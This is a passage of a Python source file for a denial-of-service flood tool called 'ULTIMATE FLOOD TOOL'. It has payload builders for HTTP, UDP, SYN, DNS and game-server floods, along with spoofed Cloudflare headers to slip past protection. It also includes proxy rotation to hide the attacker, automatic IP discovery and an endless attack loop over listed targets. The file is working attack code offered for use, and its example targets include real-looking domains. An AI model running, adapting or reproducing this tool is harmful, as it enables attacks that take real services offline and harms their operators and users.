            "Flink", "Storm", "Samza", "Heron", "Apex", "Flume", "Kafka", "Pulsar", 
            "RabbitMQ", "ActiveMQ", "ZeroMQ", "NATS", "NSQ", "Logstash", "Kibana", 
            "Grafana", "Prometheus", "Telegraf", "Chronograf", "Kapacitor", "Graphite", 
            "StatsD", "DataDog", "NewRelic", "Dynatrace", "AppDynamics", "Splunk", 
            "SumoLogic", "Logz.io", "Loggly", "Papertrail", "Scalyr", "Mezmo", "Sematext", 
            "Coralogix", "Axiom", "Quickwit", "Quake", "Steam", "RCON", "VNC"
        }
        if possible_method in valid_methods:
            method = possible_method
            parts = parts[:-1]
    
    remaining = ':'.join(parts)
    
    if remaining.startswith(('http://', 'https://')):
        parsed = urlparse(remaining)
        host = parsed.netloc or parsed.path
        if '/' in host:
            host = host.split('/')[0]
    else:
        host = remaining
    
    host = host.rstrip('/')
    
    if ':' in host:
        host_parts = host.split(':')
        if len(host_parts) == 2 and host_parts[1].isdigit():
            host = host_parts[0]
            port = int(host_parts[1])
    
    if port is None:
        if remaining.startswith('https://'):
            port = 443
        elif remaining.startswith('http://'):
            port = 80
        else:
            port = 443
    
    host = host.strip()
    return (host, port, method)

# ================== PAYLOAD BUILDERS ==================

def build_get_payload(target_ip, target_port, data_size=DATA_SIZE):
    if RANDOMIZE_REQUESTS:
        return get_randomized_request(target_ip, target_port, "GET")
    random_agent = random.choice(USER_AGENTS)
    random_path = f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))}"
    return f"GET {random_path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random_agent}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode()

def build_post_payload(target_ip, target_port, data_size=DATA_SIZE):
    if RANDOMIZE_REQUESTS:
        return get_randomized_request(target_ip, target_port, "POST")
    random_agent = random.choice(USER_AGENTS)
    random_path = f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))}"
    payload = os.urandom(data_size)
    return f"POST {random_path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random_agent}\r\nContent-Length: {data_size}\r\n\r\n".encode() + payload

def build_cfbuam_payload(target_ip, target_port, data_size=DATA_SIZE):
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    random_agent = random.choice(USER_AGENTS)
    random_path = f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))}"
    
    uam_headers = [
        f"CF-Connecting-IP: {fake_ip}",
        f"CF-IPCountry: {random.choice(['US', 'GB', 'DE', 'FR', 'JP', 'CN', 'RU'])}",
        f"CF-Ray: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))}",
        f"CF-Visitor: {{\"scheme\":\"https\"}}",
        f"cf_clearance: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789._-', k=64))}",
        f"__cf_bm: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))}",
        f"X-Forwarded-For: {fake_ip}",
        f"X-Real-IP: {fake_ip}",
    ]
    
    for _ in range(random.randint(5, 15)):
        key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=random.randint(5,10)))
        val = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10,20)))
        uam_headers.append(f"{key}: {val}")
    
    header_str = "\r\n".join(uam_headers)
    return f"GET {random_path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random_agent}\r\n{header_str}\r\nConnection: keep-alive\r\n\r\n".encode()

def build_udp_flood(target_ip, target_port, data_size=DATA_SIZE):
    return os.urandom(data_size)

def build_syn_flood(target_ip, target_port, data_size=DATA_SIZE):
    return b"\x00" * 40

def build_fivem_payload(target_ip, target_port, data_size=DATA_SIZE):
    methods = ["getinfo", "getstatus", "getchallenge", "ping", "playerlist"]
    method = random.choice(methods)
    if method == "getinfo":
        return b"\xFF\xFF\xFF\xFFgetinfo" + os.urandom(16)
    elif method == "getstatus":
        return b"\xFF\xFF\xFF\xFFgetstatus" + os.urandom(8)
    else:
        return b"\xFF\xFF\xFF\xFF" + method.encode() + b"\n"

def build_payload(method, target_ip, target_port, data_size=DATA_SIZE):
    if method == "GET":
        return build_get_payload(target_ip, target_port, data_size)
    if method == "POST":
        return build_post_payload(target_ip, target_port, data_size)
    if method == "CFBUAM" or method == "CLOUDFLARE":
        return build_cfbuam_payload(target_ip, target_port, data_size)
    if method == "UDP" or method == "OVH-UDP":
        return build_udp_flood(target_ip, target_port, data_size)
    if method == "SYN":
        return build_syn_flood(target_ip, target_port, data_size)
    if method == "FIVEM":
        return build_fivem_payload(target_ip, target_port, data_size)
    if method == "Minecraft":
        return b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00"
    if method == "DNS":
        domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)) + '.com'
        return b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + domain.encode() + b"\x00\x00\x01\x00\x01"
    if method == "Redis":
        return b"*1\r\n$4\r\nPING\r\n"
    return build_get_payload(target_ip, target_port, data_size)

# ================== ATTACK ENGINE WITH THREAD POOL ==================

def send_flood_safe(target_ip, target_port, method, target_key):
    """Safe version of send_flood with exception handling and thread pool"""
    try:
        while not stop_event.is_set():
            if attacks_paused:
                time.sleep(1)
                continue
            
            if RATE_LIMIT_DETECTION and rate_limit_detected.get(target_key, False):
                time.sleep(random.uniform(0.05, 0.2))
            
            proxy = get_tested_proxy()
            if not proxy:
                time.sleep(0.1)
                continue
            
            proxy_ip, proxy_port, proxy_type = proxy
            try:
                payload = build_payload(method, target_ip, target_port)
                
                if proxy_type in (socks.SOCKS5, socks.SOCKS4):
                    s = socks.socksocket()
                    s.set_proxy(proxy_type, proxy_ip, proxy_port)
                    s.settimeout(TIMEOUT)
                    s.connect((target_ip, target_port))
                    s.sendall(payload)
                    response = s.recv(1024) if RESPONSE_ANALYSIS else b""
                    s.close()
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    s.connect((proxy_ip, proxy_port))
                    connect_cmd = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
                    s.sendall(connect_cmd.encode())
                    resp = s.recv(1024)
                    if b"200" in resp:
                        s.sendall(payload)
                        response = s.recv(1024) if RESPONSE_ANALYSIS else b""
                    else:
                        response = b""
                    s.close()
                
                if RESPONSE_ANALYSIS and response:
                    analyze_response(response, target_key)
                
                with stats_lock:
                    total_requests += 1
                    total_bytes += len(payload)
                    
            except Exception:
                pass
    except Exception as e:
        pass

def attack_loop_thread_pool(target_ip, target_port, method, target_label):
    """Attack loop using thread pool - FIXES 'can't start new thread' error"""
    global active_attacks
    
    target_key = f"{target_ip}:{target_port}:{method}"
    with target_lock:
        if target_key in active_attacks:
            return
        active_attacks[target_key] = True
    
    print(f"[⚔️] Attacking {target_label} -> {target_ip}:{target_port} (Method: {method})")
    
    # Initialize thread pool
    init_thread_pool()
    
    # Calculate threads per IP (capped and limited)
    total_workers = min(THREADS, 2000)
    active_count = len(active_attacks)
    threads_per_ip = max(1, total_workers // max(1, active_count // 2))
    threads_per_ip = min(threads_per_ip, 200)  # Hard cap per IP
    
    # Submit attack tasks to thread pool
    futures = []
    for _ in range(threads_per_ip):
        future = attack_thread_pool.submit(send_flood_safe, target_ip, target_port, method, target_key)
        with future_lock:
            active_futures.add(future)
    
    # Keep attack running
    while not stop_event.is_set():
        # Clean completed futures periodically
        with future_lock:
            completed = {f for f in active_futures if f.done()}
            active_futures -= completed
        time.sleep(5)
    
    # Cleanup
    for future in list(active_futures):
        future.cancel()
    
    with target_lock:
        if target_key in active_attacks:
            del active_attacks[target_key]

def auto_attack_discovered(target_host, target_port, method, target_id):
    """Discover all IPs and attack each one using thread pool"""
    try:
        ip_list = discover_ips(target_host, target_port)
        if not ip_list:
            print(f"[-] No IPs discovered for {target_host}")
            return
        
        # Limit IPs per target to prevent thread explosion
        ip_list = ip_list[:MAX_IPS_PER_TARGET]
        
        for ip in ip_list:
            if stop_event.is_set():
                break
            attack_loop_thread_pool(ip, target_port, method, f"{target_host}")
            time.sleep(0.1)  # Stagger IP attacks
            
    except Exception as e:
        print(f"[-] Error attacking {target_host}: {e}")

def load_targets(targets_file):
    targets = []
    try:
        with open(targets_file, 'r') as f:
            for line in f:
                parsed = parse_target(line)
                if parsed:
                    host, port, method = parsed
                    targets.append((host, port, method))
        return targets
    except Exception as e:
        print(f"[-] Error loading targets file: {e}")
        return []

def reload_and_attack_loop():
    global stop_event, attacks_paused
    
    print("\n" + "="*80)
    print("[🚀] ULTIMATE FLOOD TOOL - ENHANCED EDITION (NO METHOD ROTATION)")
    print("[🧵] THREAD POOL MODE - No 'can't start new thread' errors")
    print("="*80)
    print(f"[⚡] Dynamic Thread Adjustment: {'ON' if THREADS_AUTO_ADJUST else 'OFF'}")
    print(f"[🌍] Geo-Targeting: {'ON' if GEO_TARGETING else 'OFF'}")
    print(f"[🛡️] Rate-Limit Detection: {'ON' if RATE_LIMIT_DETECTION else 'OFF'}")
    print(f"[📊] Response Analysis: {'ON' if RESPONSE_ANALYSIS else 'OFF'}")
    print(f"[🔍] Proxy Testing: {'ON' if PROXY_TEST_ENABLED else 'OFF'}")
    print(f"[🎲] Request Randomization: {'ON' if RANDOMIZE_REQUESTS else 'OFF'}")
    print(f"[💻] Resource Monitoring: {'ON' if RESOURCE_MONITORING else 'OFF'}")
    print(f"[🔄] Method Rotation: DISABLED (uses specified method permanently)")
    print("="*80)
    print(f"[*] Thread pool size: {min(THREADS_MAX, 2000)} workers")
    print(f"[*] Max IPs per target: {MAX_IPS_PER_TARGET}")
    print(f"[*] Concurrent targets: {CONCURRENT_TARGETS}")
    print(f"[*] Proxy rotation every {PROXY_ROTATION_INTERVAL // 60} minutes")
    print(f"[*] Reloading targets every {RELOAD_TARGETS_INTERVAL} seconds")
    print("[*] Press Ctrl+C to stop all attacks\n")
    
    # Initialize thread pool
    init_thread_pool()
    
    # Start background threads
    proxy_refresh_thread = threading.Thread(target=refresh_proxies_loop, daemon=True)
    proxy_refresh_thread.start()
    
    monitor = threading.Thread(target=monitor_stats, daemon=True)
    monitor.start()
    
    target_counter = 0
    
    while not stop_event.is_set():
        while len(PROXY_LIST) < MIN_PROXIES_REQUIRED:
            if stop_event.is_set():
                return
            print(f"[!] Only {len(PROXY_LIST)} proxies available. Need {MIN_PROXIES_REQUIRED}")
            time.sleep(10)
        
        targets = load_targets("targets.txt")
        
        if not targets:
            print("[-] No targets found in targets.txt, waiting...")
            time.sleep(RELOAD_TARGETS_INTERVAL)
            continue
        
        print(f"[+] Loaded {len(targets)} targets from targets.txt")
        print("[+] Discovering IPs and starting attacks...")
        
        # Limit concurrent targets
        targets = targets[:CONCURRENT_TARGETS]
        
        with ThreadPoolExecutor(max_workers=min(len(targets), CONCURRENT_TARGETS)) as executor:
            futures = []
            for target_host, target_port, method in targets:
                target_counter += 1
                if method is None:
                    method = "GET"
                future = executor.submit(auto_attack_discovered, target_host, target_port, method, target_counter)
                futures.append(future)
            time.sleep(5)
        
        total_ip_attacks = len(active_attacks)
        print(f"[+] Attacking {total_ip_attacks} IPs across all targets INFINITELY!")
        print(f"[*] Next target reload in {RELOAD_TARGETS_INTERVAL} seconds...")
        
        for _ in range(RELOAD_TARGETS_INTERVAL):
            if stop_event.is_set():
                break
            time.sleep(1)

def monitor_stats():
    global start_time
    start_time = time.time()
    last_req = 0
    last_bytes = 0
    last_resource_check = 0
    
    while not stop_event.is_set():
        time.sleep(1)
        
        if THREADS_AUTO_ADJUST and time.time() - start_time > 60:
            adjust_threads()
        
        if RESOURCE_MONITORING and time.time() - last_resource_check > 30:
            optimize_resources()
            last_resource_check = time.time()
        
        with stats_lock:
            req_now = total_requests
            bytes_now = total_bytes
        
        rps = req_now - last_req
        mbps = (bytes_now - last_bytes) / (1024 * 1024)
        active_targets = len(active_attacks)
        proxy_count = len(PROXY_LIST)
        uptime = int(time.time() - start_time)
        
        sys.stdout.write(f"\r[📊] RPS: {rps:,} | Total: {req_now:,} | Data: {bytes_now/(1024*1024):.1f}MB | {mbps:.2f}MB/s | Targets: {active_targets} | Proxies: {proxy_count} | Threads: {THREADS} | Uptime: {uptime//3600:02d}:{(uptime%3600)//60:02d}:{uptime%60:02d}   ")
        sys.stdout.flush()
        
        last_req = req_now
        last_bytes = bytes_now

# ================== CLI ==================
def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n[*] Stopping all attacks...")
    stop_event.set()
    shutdown_thread_pool()
    time.sleep(2)
    sys.exit(0)

def main():
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\n" + "="*80)
    print("🔥 ULTIMATE FLOOD TOOL - THREAD POOL EDITION 🔥")
    print("="*80)
    print("✨ Features:")
    print("  • Thread Pool Mode - NO 'can't start new thread' errors")
    print("  • Auto IP Discovery (finds ALL IPs for each domain)")
    print("  • Dynamic Thread Adjustment (auto-scales performance)")
    print("  • Proxy Quality Testing (only uses working proxies)")
    print("  • Request Randomization (avoids detection)")
    print("  • Resource Monitoring (prevents system overload)")
    print("  • NO METHOD ROTATION - Uses specified method permanently")
    print("  • 56+ MHDDoS Attack Methods")
    print("="*80)
    
    if not load_proxies():
        print("[*] No proxies found. Scraping initial proxies...")
        scrape_all_proxies(force=True)
    
    print("\n📋 Commands:")
    print("  startauto  - Start infinite auto-attack mode")
    print("  scrape     - Scrape new proxies immediately")
    print("  status     - Show active attacks and stats")
    print("  stop       - Stop all attacks")
    print("  exit       - Exit program")
    
    print("\n📁 Targets.txt format:")
    print("  https://example.com:443:CFBUAM")
    print("  https://target.com:443:CLOUDFLARE")
    print("  fivem-server.com:30120:FIVEM")
    print("  threat.rip:443:OVH-UDP")
    print("  any.run:443:SYN")
    print("  example.com:80:GET")
    
    print(f"\n⚙️ Current Settings:")
    print(f"  Threads: {THREADS} (max {THREADS_MAX})")
    print(f"  Concurrent Targets: {CONCURRENT_TARGETS}")
    print(f"  Max IPs per Target: {MAX_IPS_PER_TARGET}")
    print(f"  Thread Pool: {min(THREADS_MAX, 2000)} workers")
    
    while True:
        try:
            cmd = input("\n🔥 flood> ").strip().lower()
            if not cmd:
                continue
            
            if cmd == "startauto":
                if active_attacks:
                    print("[!] Attacks already running. Use 'stop' first.")
                    continue
                reload_and_attack_loop()
            
            elif cmd == "scrape":
                scrape_all_proxies(force=True)
            
            elif cmd == "status":
                print("\n📊 STATUS REPORT:")
                print(f"  Active IP attacks: {len(active_attacks)}")
                for attack in list(active_attacks)[:20]:
                    print(f"    - {attack}")
                if len(active_attacks) > 20:
                    print(f"    ... and {len(active_attacks) - 20} more")
                print(f"  Available proxies: {len(PROXY_LIST)}")
                print(f"  Next proxy refresh: {int(PROXY_ROTATION_INTERVAL - (time.time() - last_proxy_refresh))}s")
                print(f"  Total requests: {total_requests:,}")
                print(f"  Total data: {total_bytes / (1024*1024):.1f} MB")
                print(f"  Current threads: {THREADS}")
                if RESOURCE_MONITORING:
                    resources = check_resources()
                    print(f"  CPU: {resources.get('cpu', 0):.1f}%")
                    print(f"  Memory: {resources.get('memory', 0):.1f}%")
                with future_lock:
                    print(f"  Active futures: {len(active_futures)}")
            
            elif cmd == "stop":
                print("[*] Stopping all attacks...")
                stop_event.set()
                shutdown_thread_pool()
                time.sleep(3)
                print("[+] All attacks stopped.")
                stop_event.clear()
                active_attacks.clear()
                discovered_ips_cache.clear()
                rate_limit_detected.clear()
                response_tracking.clear()
                print("[*] You can start new attacks with 'startauto'")
            
            elif cmd == "exit":
                if active_attacks:
                    print("[*] Stopping all attacks before exit...")
                    stop_event.set()
                    shutdown_thread_pool()
                    time.sleep(3)
                break
            
            else:
                print("Available commands: startauto, scrape, status, stop, exit")
                
        except KeyboardInterrupt:
            print("\n[*] Stopping all attacks...")
            stop_event.set()
            shutdown_thread_pool()
            time.sleep(2)
            break
    
    print("\n👋 Goodbye!")

if __name__ == "__main__":
    main()
